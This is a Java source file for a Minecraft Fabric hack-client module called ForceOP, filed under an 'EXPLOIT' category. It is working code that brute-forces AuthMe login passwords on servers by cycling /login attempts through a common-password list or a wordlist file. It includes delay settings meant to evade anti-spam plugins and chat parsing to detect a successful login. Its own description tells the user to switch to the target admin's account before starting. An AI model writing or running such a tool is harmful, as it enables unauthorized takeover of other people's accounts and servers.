package com.claudemc.module.impl.misc;

import com.claudemc.module.Category;
import com.claudemc.module.Module;
import net.fabricmc.fabric.api.client.message.v1.ClientReceiveMessageEvents;
import net.minecraft.client.MinecraftClient;
import net.minecraft.text.Text;

import net.fabricmc.loader.api.FabricLoader;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.List;

/**
 * AuthMe password cracker.
 *
 * Tries /login <username> first (username-as-password is the most common AuthMe
 * configuration), then works through a built-in list of common passwords, or a
 * user-supplied TXT file (one password per line).
 *
 * Settings
 * --------
 * DelayMS   — milliseconds to wait between attempts (default 1000; ≥1000 bypasses
 *             most AntiSpam plugins; minimum 50 for servers without AntiSpam).
 * WaitMsg   — if true, waits for a "wrong password" server reply before sending the
 *             next attempt.  Slower but more accurate.
 * PwList    — "default" to use the built-in list, or an absolute path to a TXT file
 *             with one password per line.
 */
public class ForceOP extends Module {

    public static ForceOP INSTANCE;

    // ── Built-in password list (matches Wurst's default) ─────────────────
    private static final String[] DEFAULT_PASSWORDS = {
        "password", "passwort", "password1", "passwort1", "password123",
        "passwort123", "pass", "pw", "pw1", "pw123", "hallo", "Wurst", "wurst",
        "1234", "12345", "123456", "1234567", "12345678", "123456789",
        "login", "register", "test", "sicher", "me", "penis", "penis1",
        "penis123", "minecraft", "minecraft1", "minecraft123", "mc",
        "admin", "server", "yourmom", "tester", "account", "creeper",
        "gronkh", "lol", "auth", "authme", "qwerty", "qwertz",
        "ficken", "ficken1", "ficken123", "fuck", "fuckme", "fuckyou"
    };

    // ── State ─────────────────────────────────────────────────────────────
    private enum Phase { IDLE, RUNNING, DONE }

    private Phase    phase       = Phase.IDLE;
    private String[] passwords   = DEFAULT_PASSWORDS;
    private int      index       = -1;   // -1 = first attempt (username as pw), 0..n = password list
    private long     nextSendMs  = 0;
    private volatile boolean gotWrongMsg = false;

    // ── Chat listener (registered once, guards on isEnabled) ─────────────
    private boolean listenerRegistered = false;

    public ForceOP() {
        super("ForceOP",
              "Cracks AuthMe passwords by trying common passwords with /login. " +
              "Use on cracked servers with AuthMe. Switch to the target admin's account via AltManager first.",
              Category.EXPLOIT);
        addNumber("DelayMS",  1000, 50, 10000, 50, true);
        addBool("WaitMsg",    true);
        addSetting("PwList",  "default");
        INSTANCE = this;

        // Register once; handler checks isEnabled() each call
        ClientReceiveMessageEvents.GAME.register((msg, overlay) -> {
            if (!isEnabled() || phase != Phase.RUNNING) return;
            handleServerMessage(msg.getString());
        });
        listenerRegistered = true;
    }

    // ── Module lifecycle ──────────────────────────────────────────────────

    @Override
    public void onEnable() {
        var client = MinecraftClient.getInstance();
        if (client.player == null || client.getNetworkHandler() == null) {
            msg("§cNot connected — cannot start.");
            setEnabled(false);
            return;
        }

        loadPasswordList();
        index        = -1;
        gotWrongMsg  = false;
        nextSendMs   = System.currentTimeMillis() + 500; // brief startup pause
        phase        = Phase.RUNNING;

        msg("§7Starting — §f" + (passwords.length + 1) + " §7passwords to try.");
        msg("§7Delay: §f" + getSetting("DelayMS") + "ms§7, " +
            "WaitMsg: §f" + getSetting("WaitMsg"));
    }

    @Override
    public void onDisable() {
        phase = Phase.IDLE;
    }

    @Override
    public void onTick(MinecraftClient client) {
        if (client.player == null || client.getNetworkHandler() == null) return;
        if (phase != Phase.RUNNING) return;

        long now = System.currentTimeMillis();
        boolean waitMsg = Boolean.parseBoolean(getSetting("WaitMsg"));
        int delayMs = parseInt(getSetting("DelayMS"), 1000);

        // If WaitMsg is on, don't advance until server acknowledged last attempt
        if (waitMsg && !gotWrongMsg && index >= 0) return;

        if (now < nextSendMs) return;

        // Advance to next password
        index++;

        // index == 0 → try username as password (first attempt)
        // index >  0 → try passwords[index-1]
        if (index == 0) {
            String username = client.player.getGameProfile().name();
            sendLogin(client, username);
            msg("§8[" + index + "/" + (passwords.length + 1) + "] §7Trying username: §f" + username);
        } else if (index - 1 < passwords.length) {
            String pw = passwords[index - 1];
            gotWrongMsg = false;
            sendLogin(client, pw);
            if (index % 10 == 0 || index <= 3)
                msg("§8[" + index + "/" + (passwords.length + 1) + "] §7Trying: §f" + pw);
        } else {
            // Exhausted all passwords
            msg("§c[§4§lFAILURE§c] §fAll " + (passwords.length + 1) + " passwords were wrong.");
            phase = Phase.DONE;
            setEnabled(false);
        }

        nextSendMs = now + delayMs;
    }

    // ── Chat message analysis ─────────────────────────────────────────────

    private void handleServerMessage(String raw) {
        String lower = raw.toLowerCase();

        // Strip colour codes for matching
        String plain = raw.replaceAll("§[0-9a-fk-or]", "").toLowerCase();

        // Skip our own status messages
        if (plain.contains("[forceop]")) return;

        // Success indicators (multi-language, same set as Wurst)
        if (containsAny(plain, "success", "logged in", "erfolgreich", "eingeloggt",
                        "eingelogt", "succès", "succès", "éxito")) {
            String pw = currentPassword(MinecraftClient.getInstance());
            msg("§a[§2§lSUCCESS§a] §fPassword: \"§e" + pw + "§f\"");
            phase = Phase.DONE;
            setEnabled(false);
            return;
        }

        // Wrong-password indicators
        if (containsAny(plain, "wrong", "incorrect", "falsch", "invalid",
                        "mauvais", "mal", "sbagliato", "bad password",
                        "failed", "fehler")) {
            gotWrongMsg = true;
            return;
        }

        // Soft hints
        if (containsAny(plain, "/help", "permission", "no authme", "not installed")) {
            msg("§e[!] Server may not have AuthMe — stopping.");
            setEnabled(false);
            return;
        }

        if (containsAny(plain, "already logged", "already authenticated", "already auth")) {
            msg("§e[!] Already logged in.");
            setEnabled(false);
            return;
        }

        // Login timeout / kick → just signal wrong so next attempt proceeds
        if (containsAny(plain, "login timeout", "timed out")) {
            gotWrongMsg = true;
        }
    }

    // ── Helpers ───────────────────────────────────────────────────────────

    private void sendLogin(MinecraftClient client, String pw) {
        try {
            client.getNetworkHandler().sendChatCommand("login " + pw);
        } catch (Exception e) {
            // If the command send fails (e.g. brief tick overlap), retry next tick
        }
    }

    private String currentPassword(MinecraftClient client) {
        if (index == 0) {
            return client != null && client.player != null
                ? client.player.getGameProfile().name() : "?";
        }
        int pwIdx = index - 1;
        return (pwIdx < passwords.length) ? passwords[pwIdx] : "?";
    }

    private void loadPasswordList() {
        String listSetting = getSetting("PwList").trim();
        if ("default".equalsIgnoreCase(listSetting) || listSetting.isEmpty()) {
            passwords = DEFAULT_PASSWORDS;
            return;
        }
        try {
            Path base     = FabricLoader.getInstance().getGameDir().resolve("wordlists").toAbsolutePath().normalize();
            Path resolved = base.resolve(listSetting).toAbsolutePath().normalize();
            if (!resolved.startsWith(base)) {
                msg("§c[!] Path traversal blocked: " + listSetting + " — using default list.");
                passwords = DEFAULT_PASSWORDS;
                return;
            }
            List<String> lines = Files.readAllLines(resolved, StandardCharsets.UTF_8);
            passwords = lines.stream()
                .map(String::trim)
                .filter(s -> !s.isEmpty() && !s.startsWith("#"))
                .toArray(String[]::new);
            msg("§7Loaded §f" + passwords.length + " §7passwords from file.");
        } catch (IOException e) {
            msg("§c[!] Could not load password file: §f" + e.getMessage() + " §7— using default list.");
            passwords = DEFAULT_PASSWORDS;
        }
    }

    private void msg(String text) {
        MinecraftClient mc = MinecraftClient.getInstance();
        if (mc.player != null)
            mc.player.sendMessage(Text.literal("§5[ForceOP] §7" + text), false);
    }

    private int parseInt(String s, int def) {
        try { return (int) Double.parseDouble(s.trim()); } catch (Exception e) { return def; }
    }

    private boolean containsAny(String msg, String... words) {
        for (String w : words) if (msg.contains(w)) return true;
        return false;
    }
}
